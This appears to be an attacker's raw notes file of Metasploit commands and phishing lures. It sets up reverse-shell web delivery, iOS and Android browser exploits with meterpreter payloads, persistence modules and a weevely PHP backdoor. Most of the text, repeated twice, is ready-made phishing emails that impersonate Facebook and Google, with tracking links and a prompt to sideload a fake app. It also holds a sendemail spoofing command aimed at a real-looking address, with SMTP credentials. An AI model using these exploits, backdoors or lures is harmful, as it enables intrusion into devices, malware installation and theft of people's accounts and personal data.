use exploit windows/smb/ms04_007_killbill


use exploit/windows/dcerpc/ms06_040_netapi



use exploit/windows/smb/ms09_050_smb2_negotiate_func_index


*****************************************************************************
metasploit web delivery "makes scripts that can create shells"

use exploit/multi/script/web_delivery

set SRVHOST 192.168.1.212

set SRVPORT 8080

set LHOST 192.168.1.212

set LPORT 443

set PAYLOAD windows/meterpreter/reverse_tcp

show targets

set TARGET 1

set URIPATH /google




*******************************************************************************

"always set r host for these windows exploits"

persistance exploit

windows/local/s4u_persistance

windows/local/persistance

**************************************************************************************************************************

make php backdoor with weevely 

 weevely generate test /root/Desktop/404.php






**********************************************************************************************************************************
#iphone broswer exploit

use exploit/apple_ios/browser/safari_libtiff

set URIPATH /

set SRVHOST 10.0.0.16

set SRVPORT 443

exploit

****************************************************************************************************
#android browser exploit

use exploit/android/browser/webview_addjavascriptinterface

set LPORT 4444

set LHOST 10.0.0.15

set PAYLOAD android/meterpreter/reverse_tcp

set URIPATH /google

set SRVHOST 10.0.0.15

exploit





******************************************************************************************************************************
#Prelaid Facebook phising email

Facebook Technical Help.

We noticed some unusual activity in your Facebook account it has been access by the ip address 213.454.783 Location 'Russia' location is based from ip address and may have been compromised if this activity was not from you please take immediate actions to secure your Facebook account or risk lost of your Facebook account, identity theft, loss of personal data such as pictures and cyber attacks from the compromised account to your friends and family only use the secure web portal provided below or risk further damage we urge you to take immediate action to secure your account with the secure web portal below login and follow the process also we also suggest you delete your current Facebook app and download secure and updated Facebook app we have provided in this message but this step is not necessary for the recovery process just suggested we are sorry about this inconvenience and are constantly working to make Facebook a safer place for everyone.


Secure your account here.
Secure web portal https://grabify.link/N636QR




Updated Facebook app.
Download the Facebook app here or use attachment https://grabify.link/3OL46F


'The Facebook Technical Help Team.'

##################################



"HIGH LEVEL ALERT!"
#Threat level high.
#Immediate action needed.
#priority status level one.


Your Facebook app and account has been compromised by hackers to regain control of your account delete the Facebook app Which has been infected with A virus called A Trojan this Trojan is leaking your private information to hackers remotely this is extremely dangerous passwords, banking info, ID info, GPS Data and more is being leaked from this Trojan virus to prevent more damage and to remove the virus you must immediately delete the infected Facebook app on your phone now and download the safe app we have provided below simply download the app follow the directions of installation and the virus will be removed and your app will be safe again "Settings may need to be set to 'allow unknown sources' due to the nature of the cyber attack" we are sorry about this inconvenience this is from the Facebook Team.


To securely Login Into Your Facebook use this secure web portal Here https://grabify.link/ZAZYHF for security reasons DO NOT login to Facebook anywhere else in till you have installed the new safe app.




'From The Facebook Security Team' 




######################################

"HIGH LEVEL ALERT!"
#Threat level high.
#Immediate action needed.
#priority status level one.


Your Facebook account has had a lot of suspicious activity lately and has been compromised by attackers to regain control of your account login to the secure web portal provided below only use the secure web portal provided below or risk even more damage ignoring this threat can and will lead to general information leaks, passwords leaks, banking information leaks, ID information leaks and theft, GPS Data leaks and remote tracking, loss of control or permanent loss your Facebook account, cyber attacks on you your friends family and Facebook contacts and even more possible damage.
"To prevent this and regain control of your account login to the secure web portal we provided below this information was sent out via security protocol to the recovery E-mail of this account we apologize for the inconvenience and we are working hard everyday to make Facebook safer."


                                            Secure Web Portal.
Click here to recover your account    Https://grabify.link/HCSA1E.html


'From The Facebook Security Team' 







*********************************************************************************************



send spoofed email

sendemail -f Google@Google.com -t lwillia46@gmail.com -u Security Alert! -m Your E-mail Account lwillia46@gmail.com has had suspicious activity happening in the last 24 hrs it is imperative to review your syned device, sign ins, security settings and secure your account immediately failure to do so could lead to loss of your account data leaks unwanted tracking cyber, attacks to friends family and yourself and more please use the secure web link we are providing below and secure your account we are sorry about this matter and are working everyday to make google safer for everyone.
secure link https://grabify.link/QOLJMV
From The Google Team. -s mail.smtp2go.com:2525 -xu facebooktechnicalhelplink@gmail.com -xp Metasploit$

****************************************************************************************







******************************************************************************************************************************
#Prelaid Facebook phising email

Facebook Technical Help.

We noticed some unusual activity in your Facebook account it has been access by the ip address 213.454.783 Location 'Russia' location is based from ip address and may have been compromised if this activity was not from you please take immediate actions to secure your Facebook account or risk lost of your Facebook account, identity theft, loss of personal data such as pictures and cyber attacks from the compromised account to your friends and family only use the secure web portal provided below or risk further damage we urge you to take immediate action to secure your account with the secure web portal below login and follow the process also we also suggest you delete your current Facebook app and download secure and updated Facebook app we have provided in this message but this step is not necessary for the recovery process just suggested we are sorry about this inconvenience and are constantly working to make Facebook a safer place for everyone.


Secure your account here.
Secure web portal https://grabify.link/N636QR




Updated Facebook app.
Download the Facebook app here or use attachment https://grabify.link/3OL46F


'The Facebook Technical Help Team.'

##################################



"HIGH LEVEL ALERT!"
#Threat level high.
#Immediate action needed.
#priority status level one.


Your Facebook app and account has been compromised by hackers to regain control of your account delete the Facebook app Which has been infected with A virus called A Trojan this Trojan is leaking your private information to hackers remotely this is extremely dangerous passwords, banking info, ID info, GPS Data and more is being leaked from this Trojan virus to prevent more damage and to remove the virus you must immediately delete the infected Facebook app on your phone now and download the safe app we have provided below simply download the app follow the directions of installation and the virus will be removed and your app will be safe again "Settings may need to be set to 'allow unknown sources' due to the nature of the cyber attack" we are sorry about this inconvenience this is from the Facebook Team.


To securely Login Into Your Facebook use this secure web portal Here https://grabify.link/ZAZYHF for security reasons DO NOT login to Facebook anywhere else in till you have installed the new safe app.




'From The Facebook Security Team' 




######################################

"HIGH LEVEL ALERT!"
#Threat level high.
#Immediate action needed.
#priority status level one.


Your Facebook account has had a lot of suspicious activity lately and has been compromised by attackers to regain control of your account login to the secure web portal provided below only use the secure web portal provided below or risk even more damage ignoring this threat can and will lead to general information leaks, passwords leaks, banking information leaks, ID information leaks and theft, GPS Data leaks and remote tracking, loss of control or permanent loss your Facebook account, cyber attacks on you your friends family and Facebook contacts and even more possible damage.
"To prevent this and regain control of your account login to the secure web portal we provided below this information was sent out via security protocol to the recovery E-mail of this account we apologize for the inconvenience and we are working hard everyday to make Facebook safer."


                                            Secure Web Portal.
Click here to recover your account    Https://grabify.link/HCSA1E.html


'From The Facebook Security Team' 







***********************************************************************************************************************************************************************



send spoofed email

sendemail -f Google@Google.com -t lwillia46@gmail.com -u Security Alert! -m Your E-mail Account lwillia46@gmail.com has had suspicious activity happening in the last 24 hrs it is imperative to review your syned device, sign ins, security settings and secure your account immediately failure to do so could lead to loss of your account data leaks unwanted tracking cyber, attacks to friends family and yourself and more please use the secure web link we are providing below and secure your account we are sorry about this matter and are working everyday to make google safer for everyone.
secure link https://grabify.link/QOLJMV
From The Google Team. -s mail.smtp2go.com:2525 -xu facebooktechnicalhelplink@gmail.com -xp Metasploit$

******************************************************************************************************************************************************************
